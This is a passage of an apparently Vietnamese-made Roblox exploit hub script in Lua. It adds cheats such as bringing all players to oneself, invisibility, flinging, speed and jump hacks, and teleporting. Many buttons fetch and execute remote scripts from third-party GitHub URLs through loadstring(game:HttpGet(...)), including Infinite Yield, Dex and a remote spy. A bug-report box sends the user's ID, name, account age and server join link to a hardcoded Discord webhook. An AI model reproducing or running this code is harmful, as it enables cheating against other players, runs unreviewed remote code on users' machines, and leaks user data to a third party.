  local ok = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)  
  local tween = game.TweenService:Create(game.Players[plr].Character.HumanoidRootPart, TweenInfo.new(), {CFrame = ok * CFrame.new(0, 5, 0)})   
  tween:Play() wait()  
  
  end)  
  end  
  end)  
 end 
  end)  
  tgls:Toggle("Auto Bring All Player",false, function(t)  
  local v2 = nil
getgenv().brin = t
if v2 then a:Disconnect() end
if brin ~= v2 then
v2 = game:GetService("RunService").RenderStepped:Connect(function()
if brin == false then v2:Disconnect() end
 for i, v in pairs(game.Players:GetChildren()) do 
 local ok = game.Players.LocalPlayer.Name 
 if v.Name ~=  ok  then  
 v.Character.HumanoidRootPart.CFrame  = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -7) wait() 
 end 
 end 
 end) 
 end 
  end)  
 
 local tgls = serv:Channel("Button")

  tgls:Button("Invisible", function()  
  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --   
  
  Local = game:GetService('Players').LocalPlayer  
  Char  = Local.Character  
  touched,tpdback = false, false  
  Local.CharacterAdded:connect(function(char)  
      if script.Disabled ~= true then  
          wait(.25)  
          loc = Char.HumanoidRootPart.Position  
          Char:MoveTo(box.Position + Vector3.new(0,.5,0))  
      end  
  end)  
  game:GetService('UserInputService').InputBegan:connect(function(key)  
      if key.KeyCode == Enum.KeyCode.Equals then  
          if script.Disabled ~= true then  
              script.Disabled = true  
              print'you may re-execute'  
          end  
      end  
  end)  
  box = Instance.new('Part',workspace)  
  box.Anchored = true  
  box.CanCollide = true  
  box.Size = Vector3.new(100,10,100)  
  box.Position = Vector3.new(0,10000,0)  
  box.Touched:connect(function(part)  
      if (part.Parent.Name == Local.Name) then  
          if touched == false then  
              touched = true  
              function apply()  
                  if script.Disabled ~= true then  
                      no = Char.HumanoidRootPart:Clone()  
                      wait(.25)  
                      Char.HumanoidRootPart:Destroy()  
                      no.Parent = Char  
                      Char:MoveTo(loc)  
                      touched = false  
                  end end  
              if Char then  
                  apply()  
              end  
          end  
      end  
  end) 
  
  repeat wait() until Char  
  loc = Char.HumanoidRootPart.Position  
  Char:MoveTo(box.Position + Vector3.new(0,.5,0))  
  end)  
  tgls:Button("Fast Mode", function()  
  local ToDisable = {  
          Textures = true,  
          VisualEffects = true,  
          Parts = true,  
          Particles = true,  
          Sky = true  
  }  
  
  local ToEnable = {  
          FullBright = false  
  }  
  
  local Stuff = {}  
  
  for _, v in next, game:GetDescendants() do  
          if ToDisable.Parts then  
                  if v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart") then  
                          v.Material = Enum.Material.SmoothPlastic  
                          table.insert(Stuff, 1, v)  
                  end  
          end  
  
          if ToDisable.Particles then  
                  if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then  
                          v.Enabled = false  
                          table.insert(Stuff, 1, v)  
                  end  
          end  
  
          if ToDisable.VisualEffects then  
                  if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then  
                          v.Enabled = false  
                          table.insert(Stuff, 1, v)  
                  end  
          end  
  
          if ToDisable.Textures then  
                  if v:IsA("Decal") or v:IsA("Texture") then  
                          v.Texture = ""  
                          table.insert(Stuff, 1, v)  
                  end  
          end  
  
          if ToDisable.Sky then  
                  if v:IsA("Sky") then  
                          v.Parent = nil  
                          table.insert(Stuff, 1, v)  
                  end  
          end  
  end  
  
  game:GetService("TestService"):Message("Effects Disabler Script : Successfully disabled "..#Stuff.." assets / effects. Settings :")  
  
  for i, v in next, ToDisable do  
          print(tostring(i)..": "..tostring(v))  
  end  
  
  if ToEnable.FullBright then  
      local Lighting = game:GetService("Lighting")  
  
      Lighting.FogColor = Color3.fromRGB(255, 255, 255)  
      Lighting.FogEnd = math.huge  
      Lighting.FogStart = math.huge  
      Lighting.Ambient = Color3.fromRGB(255, 255, 255)  
      Lighting.Brightness = 5  
      Lighting.ColorShift_Bottom = Color3.fromRGB(255, 255, 255)  
      Lighting.ColorShift_Top = Color3.fromRGB(255, 255, 255)  
      Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)  
      Lighting.Outlines = true  
  end  
  end)  
  tgls:Button("Fling Punch", function()  
  loadstring(game:HttpGet("https://raw.githubusercontent.com/fedoratums/Base-Script/Base-Script/fedoratum punch fling",true))()  
  end)  
  
  tgls:Button("Teleport Tool", function()  
  mouse = game.Players.LocalPlayer:GetMouse()  
  tool = Instance.new("Tool")  
  tool.RequiresHandle = false  
  tool.Name = "Teleport Tool"  
  tool.Activated:connect(function()  
  local pos = mouse.Hit+Vector3.new(0,2.5,0)  
  pos = CFrame.new(pos.X,pos.Y,pos.Z)  
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos  
  end)  
  tool.Parent = game.Players.LocalPlayer.Backpack  
  end)  
  tgls:Button("F3x", function()  
  loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()  
  end)  
        local sldrs = serv:Channel("Walk Speed")   
local spd = nil
    local sldr = sldrs:Slider("Speeds", 0, 1000, 0, function(v)    
_G.speed = v
local function SPDs()
if _G.speed then
pcall(function()
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v    
end)
end
end
spd = game:GetService('RunService').RenderStepped:Connect(SPDs)
    end)    
    sldrs:Button("Speed 1000", function()
for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Humanoid") then
if v.WalkSpeed == 30 or v.WalkSpeed == 150 or v.WalkSpeed == 70 or v.WalkSpeed == 500 then
DiscordLib: Notification("Warning","Please Clear Speed","Ok")
else
    sldr:Change("1000")    
end
end
end
    end)    
    sldrs:Button("Speed 500", function()    
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Humanoid") then
if v.WalkSpeed == 30 or v.WalkSpeed == 150 or v.WalkSpeed == 70 or v.WalkSpeed == 1000 then
DiscordLib: Notification("Warning","Please Clear Speed","Ok")
else
    sldr:Change("500")    
end
end
end
    end)    
sldrs:Button("Speed 150", function()    
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Humanoid") then
if v.WalkSpeed == 30 or v.WalkSpeed == 70 or v.WalkSpeed == 500 or v.WalkSpeed == 1000 then
DiscordLib: Notification("Warning","Please Clear Speed","Ok")
else
    sldr:Change("150")    
end
end
end
    end)    
    sldrs:Button("Speed 70", function()    
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Humanoid") then
if v.WalkSpeed == 30 or v.WalkSpeed == 150 or v.WalkSpeed == 500 or v.WalkSpeed == 1000 then
DiscordLib: Notification("Warning","Please Clear Speed","Ok")
else
    sldr:Change("70")    
end
end
end
    end)    
    sldrs:Button("Speed 30", function()    
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Humanoid") then
if v.WalkSpeed == 1000 or v.WalkSpeed == 150 or v.WalkSpeed == 70 or v.WalkSpeed == 500  then
DiscordLib: Notification("Warning","Please Clear Speed","Ok")
else
    sldr:Change("30")    
end
end
end
     end)    
sldrs:Button("Clear Speed", function(v)    
  spd:Disconnect()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
end)
    local jm = nil
    local sldr = sldrs:Slider("JumpPower", 0, 1000, 0, function(v)    
_G.jpm = v
local function JPMs()
if _G.jpm then
pcall(function()
game.Players.LocalPlayer.Character.Humanoid.JumpPower = v    
end)
end
end
jm = game:GetService('RunService').RenderStepped:Connect(JPMs)    
end)    
    sldrs:Button("Jump 1000", function()    
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Humanoid") then
if v.JumpPower == 70 or v.JumpPower == 100 or v.JumpPower == 300 or v.JumpPower == 500  then
DiscordLib: Notification("Warning","Please Clear Jump","Ok")
else
    sldr:Change("1000")    
end
end
end
    end)    
    sldrs:Button("Jump 500", function()    
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Humanoid") then
if v.JumpPower == 70 or v.JumpPower == 100 or v.JumpPower == 300 or v.JumpPower == 1000  then
DiscordLib: Notification("Warning","Please Clear Jump","Ok")
else
    sldr:Change("500")    
end
end
end
    end)    
    sldrs:Button("Jump 300", function()    
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Humanoid") then
if v.JumpPower == 70 or v.JumpPower == 100 or v.JumpPower == 1000 or v.JumpPower == 500  then
DiscordLib: Notification("Warning","Please Clear Jump","Ok")
else
    sldr:Change("300")    
end
end
end
    end)    
    sldrs:Button("Jump 100", function()    
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Humanoid") then
if v.JumpPower == 70 or v.JumpPower == 1000 or v.JumpPower == 300 or v.JumpPower == 500  then
DiscordLib: Notification("Warning","Please Clear Jump","Ok")
else
    sldr:Change("100")    
end
end
end
    end)    
    sldrs:Button("Jump 70", function()    
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Humanoid") then
if v.JumpPower == 1000 or v.JumpPower == 100 or v.JumpPower == 300 or v.JumpPower == 500  then
DiscordLib: Notification("Warning","Please Clear Jump","Ok")
else
    sldr:Change("70")    
end
end
end
    end)   
sldrs:Button("Clear Jump", function(v)    
  jm:Disconnect()
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 40
end)
  
  local btns = serv:Channel("More Script")
   btns:Button("Fast Mode", function()   
   local ToDisable = {   
           Textures = true,   
           VisualEffects = true,   
           Parts = true,   
           Particles = true,   
           Sky = true   
   }   

   local ToEnable = {   
           FullBright = false   
   }   

   local Stuff = {}   

   for _, v in next, game:GetDescendants() do   
           if ToDisable.Parts then   
                   if v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart") then   
                           v.Material = Enum.Material.SmoothPlastic   
                           table.insert(Stuff, 1, v)   
                   end   
           end   

           if ToDisable.Particles then   
                   if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then   
                           v.Enabled = false   
                           table.insert(Stuff, 1, v)   
                   end   
           end   

           if ToDisable.VisualEffects then   
                   if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then   
                           v.Enabled = false   
                           table.insert(Stuff, 1, v)   
                   end   
           end   

           if ToDisable.Textures then   
                   if v:IsA("Decal") or v:IsA("Texture") then   
                           v.Texture = ""   
                           table.insert(Stuff, 1, v)   
                   end   
           end   

           if ToDisable.Sky then   
                   if v:IsA("Sky") then   
                           v.Parent = nil   
                           table.insert(Stuff, 1, v)   
                   end   
           end   
   end   

   game:GetService("TestService"):Message("Effects Disabler Script : Successfully disabled "..#Stuff.." assets / effects. Settings :")   

   for i, v in next, ToDisable do   
           print(tostring(i)..": "..tostring(v))   
   end   

   if ToEnable.FullBright then   
       local Lighting = game:GetService("Lighting")   

       Lighting.FogColor = Color3.fromRGB(255, 255, 255)   
       Lighting.FogEnd = math.huge   
       Lighting.FogStart = math.huge   
       Lighting.Ambient = Color3.fromRGB(255, 255, 255)   
       Lighting.Brightness = 5   
       Lighting.ColorShift_Bottom = Color3.fromRGB(255, 255, 255)   
       Lighting.ColorShift_Top = Color3.fromRGB(255, 255, 255)   
       Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)   
       Lighting.Outlines = true   
   end   
   end)  
  btns:Button("Rejoin", function()  
  local tps = game:GetService("TeleportService")  
                  local plr = game:GetService("Players").LocalPlayer  
                  tps:TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)  
  end)  
   btns:Button("Reset Character ", function() 
 game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 0
 end) 
btns:Button("Change Server", function()
local httprequest = request or http_request or (http and http.request) or (fluxus.request and fluxus) or syn.request
PlaceId = game.PlaceId
if httprequest then
                local servers = {}
                local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100", PlaceId)})
                local body = game:GetService("HttpService"):JSONDecode(req.Body)
                if body and body.data then
                        for i, v in next, body.data do
                                if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
                                        table.insert(servers, 1, v.id)
                                end
                        end
                end
                if #servers > 0 then
                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], game:GetService("Players").LocalPlayer)
                else
                        DiscordLib:Notification("Warning","Không Tìm Được Server, Hãy Thử Lại.","Ok")
end
                end
end) 
 btns:Label("Cre Hub:Grabiel Ynu") 
btns:Textbox("Bug Report", "Type!", true, function(t)
if t then
DiscordLib:Notification("Thông Báo","Tin Nhắn Đã Được Gửi.","Ok")
HttpService = game:GetService("HttpService") 
 Webhook_URL =  "https://discord.com/api/webhooks/1167083350499020841/Iu6pVDxhv8tUDaf-tR4gCt4W8e9YGYfXF46M52uLN4jQHcfvAUJEJIl8bnY4KKu0WTD0" 
 local ok = request or http_request or (http and http.request) or syn.request 
 ok( 
 { 
 Url = Webhook_URL, 
 Method = 'POST', 
 Headers = { 
 ['Content-Type'] = 'application/json' 
 }, 
 Body = HttpService:JSONEncode({ 
 ["content"] = "", 
 ["embeds"] = {{ 
 ["author"] = { 
 ["name"] = "", 
 ["icon"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=100&height=100&format=png" 
 }, 
 ["title"] = "🐛"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, 
 ["description"] = "{ ["..game.Players.LocalPlayer.DisplayName.."] | "..game.Players.LocalPlayer.Name.." } Vừa Báo Lỗi", 
 ["type"] = "rich", 
 ["color"] = tonumber(0xffffff), 
 ["fields"] = { 
 { 
 ["name"] = "Script Join:", 
 ["value"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId,'"..game.JobId.."')", 
 ["inline"] = true }, 
 { 
 ["name"] = "Người Dùng ID:", 
 ["value"] = game:GetService("Players").LocalPlayer.UserId, 
 ["inline"] = true }, 
 { 
["name"] = "Nội Dung:", 
 ["value"] = t, 
 ["inline"] = true },
 {
 ["name"] = "Số tuổi của Account:", 
 ["value"] = game:GetService("Players").LocalPlayer.AccountAge, 
 ["inline"] = true } 
 } 
 }} 
 }) 
 })
else
DiscordLib:Notification("Thông Báo","Tin Nhắn Chưa Được Gửi Hãy Thử Lại...","Ok..")
end
end)
  btns:Button("Viet Nam Piece", function()   loadstring(game:HttpGet('https://raw.githubusercontent.com/ginchao/Viet-Nam-Piece/main/Beta'))()    
    end)  
 btns:Button("AUT OLD UNIVERSE", function()  
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ginchao/OUT-OLD-UNIVERSE/main/UNIVERSE%20OLD" ,true))()  
  end)  
 btns:Button("Lucky Block Battleground", function() 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/ginchao/LuckyBlockBattleground/main/HttVeg'))() 
 end) 
 btns:Button("Sakura Stand", function() 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/ginchao/Sakura-Stand/main/ST'))()  
 end) 
  btns:Seperator()  
btns:Button("Hub ESP",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ginchao/ESP-COPY/main/TY%20FOR%20METHOD"))()
end)
    btns:Button("Infinite Yield", function()  
  loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()  
    end)  
  btns:Button("Anti Afk", function()  
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ginchao/Anti-AFK/main/NO%20KICK" ,true))()  
  end)  
  btns:Button("Keyboard", function()  
  
                         loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()  
      end)           
  btns:Button("FlyV3", function()  
  loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))() 
         end)  
  
  btns:Button("Shift Lock", function()  
  
          loadstring(game:HttpGet("https://raw.githubusercontent.com/MiniNoobie/ShiftLockx/main/Shiftlock-MiniNoobie",true))()  
  end) 
  
  btns:Button("DEX PC", function()  
  loadstring(game:HttpGet('https://raw.githubusercontent.com/infyiff/backup/main/dex.lua'))()  
  end)  
  btns:Button("DEXv4 PC", function()  
  loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()  
  end)  
  btns:Button("Remote Spy", function()  
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/Forked/M%3ASimpleSpy%20V3" ,true))()  
  end)  
  btns:Button("CCTV Camera", function()  
  loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/CCTV%20Camera"))();  
  end)  
  btns:Button("Invisible X Teleport", function()  
  loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe./dbb6ce6f6cee4f7a5c9e20d7b88e83db2a93bf25/Invisible%20GUI'))()  
  end) 

